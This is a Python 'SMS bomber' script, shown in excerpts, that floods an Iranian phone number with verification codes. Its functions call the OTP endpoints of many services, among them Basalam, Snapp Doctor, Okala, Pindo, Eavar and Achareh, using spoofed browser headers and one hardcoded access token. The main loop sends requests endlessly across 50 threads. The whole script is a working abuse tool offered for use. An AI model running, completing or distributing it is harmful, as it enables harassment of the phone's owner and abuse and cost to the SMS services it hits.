...
def activecleaners(phone):
    activecleanersU = "https://uapi.activecleaners.ir/Auth/VerifyUser/GetVerifycode"
    activecleanersH = {
        ...
        "origin": "https://activecleaners.ir",
        "referer": "https://activecleaners.ir/"
    }
    activecleanersD = {
        "mobileOrEmail": "0" + phone.split("+98")[1],
    ...
    try:
        response = post(timeout=5, url=activecleanersU, headers=activecleanersH, json=activecleanersD).json()
        if response.get("result") == True and response.get("resultCode") == 200:
            print(f'{g}(ActiveCleaners) {w}Code Was Sent')
            return True
    except:
        return False
...
def sixty(phone):
    ...
    d = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 100; M2007J20CG MIUI/V12.0.9.0.QJGMIXM)",
        "Host": "serverhv1.xyz",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "Content-Length": "18"
...
def basalam(phone):
    basalamU = "https://auth.basalam.com/captcha/otp-request"
    basalamH = {
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        ...
        "x-client-info": '{"version":"3.18.0","project":"charsou","name":"web.public","platform":"web","deviceId":"ce9750aa-6eed-46a8-9b09-9566e8090f76","sessionId":"68a84479-7377-4391-8588-9f56f51154c4"}'
    }
    basalamD = {
        "mobile": "0" + phone.split("+98")[1],
        "client_id": "11",
    ...
    try:
        response = post(timeout=5, url=basalamU, headers=basalamH, json=basalamD).json()
        if response.get("message") == "کد تایپ به شماره شما پیامک شد.":
            print(f'{g}(Basalam) {w}Code Was Sent')
            return True
    except:
        return False

def snapp_doctor(phone):
    snapp_doctorU = f"https://api.snapp.doctor/core/Api/Common/v1/sendVerificationCode/{phone.split('+98')[1]}/sms?cCode=%2B98"
    snapp_doctorH = {
    ...
    try:
        response = get(timeout=5, url=snapp_doctorU, headers=snapp_doctorH).json()
        if response.get("result") == "SUCCESS":
            print(f'{g}(SnappDoctor) {w}Code Was Sent')
            return True
    except:
        return False

def okala(phone):
    okalaU = "https://apigateway.okala.com/api/voyager/C/CustomerAccount/OTPRegister"
    okalaH = {
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json; charset=utf-8",
        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    ...
    try:
        response = post(timeout=5, url=okalaU, headers=okalaH, json=okalaD).json()
        if response.get("success") == True:
            print(f'{g}(Okala) {w}Code Was Sent')
            return True
    except:
        return False

def pindo(phone):
    pindoU = "https://api.pindo.ir/v1/user/login-register/"
    pindoH = {
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "accept-encoding": "gzip, deflate, br",
        "origin": "https://pindo.ir",
        "referer": "https://pindo.ir/",
        "x-requested-with": "XMLHttpRequest",
        "device": "mobile",
        "device-id": "4d4de244-1485-40d4-8768-3496c26875da"
    }
    pindoD = {
        "phone": "0" + phone.split("+98")[1]
    }
    try:
        response = post(timeout=5, url=pindoU, headers=pindoH, json=pindoD).json()
        if response.get("status") == 200:
            print(f'{g}(Pindo) {w}Code Was Sent')
            return True
    except:
        return False

def eavar(phone):
    eavarU = "https://www.eavar.com/fa/v2/senddynamicmobilepassword/"
    eavarH = {
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json; charset=utf-8",
        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "accept-encoding": "gzip, deflate, br",
        "x-requested-with": "XMLHttpRequest",
        "eavar-access-token": "a71ae11f6bd8b8aef6fb902e8fbec16c",
    ...
    try:
        response = post(timeout=5, url=eavarU, headers=eavarH, json=eavarD).json()
        if response.get("isSucceed") == True:
            print(f'{g}(Eavar) {w}Code Was Sent')
            return True
    except:
        return False

def achareh(phone):
    acharehU = "https://api.achareh.co/v2/accounts/login/?web=true"
    acharehH = {
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        ...
        "client-type": "web",
        "client-user-type": "customer",
        "client-version-type": "web",
        "client-version": "5.106.0",
    ...
    try:
        response = post(timeout=5, url=acharehU, headers=acharehH, json=acharehD).json()
        if response.get("login_with_otp") == True:
            print(f'{g}(Achareh) {w}Code Was Sent')
            return True
    except:
        return False
...
def is_phone(phone: str):
    ...
    if match(r"^\+989[0-3,9]\d{8}$", phone):
        return phone
    elif match(r"^989[0-3,9]\d{8}$", phone):
        return f"+{phone}"
    elif match(r"^09[0-3,9]\d{8}$", phone):
        return f"+98{phone[1:]}"
    elif match(r"^9[0-3,9]\d{8}$", phone):
        return f"+98{phone}"
    else:
        return False
...
functions = [achareh, smarket, pindo, okorosh, divar, gap, alibaba, digikala, basalam, snapp_doctor, okala, snap, torob, tap30, eavar, activecleaners, filmnet, five, seven, forty, fifty, sixty, sventtubf]
...
# تابع اصلی برای ارسال درخواست‌ها به صورت غیرهمزمان
async def send_requests_async(phone):
    success_count = 0
    total_requests = 0
    with ThreadPoolExecutor(max_workers=50) as executor:  # افزایش تعداد کارگرها
        while True:  # حلقه بی‌نهایت برای ارسال مداوم
            futures = [executor.submit(func, phone) for func in functions]
            total_requests += len(functions)
            
            for i, future in enumerate(futures):
                result = future.result()
                success_count += 1 if result else 0
                print(f"{g}[+] Sending request {total_requests - len(functions) + i + 1}... {'Success' if result else 'Failed'}")
            
            await asyncio.sleep(0.1)  # تاخیر 0.1 ثانیه بین هر دور

# اجرای برنامه
try:
    asyncio.run(send_requests_async(phone))
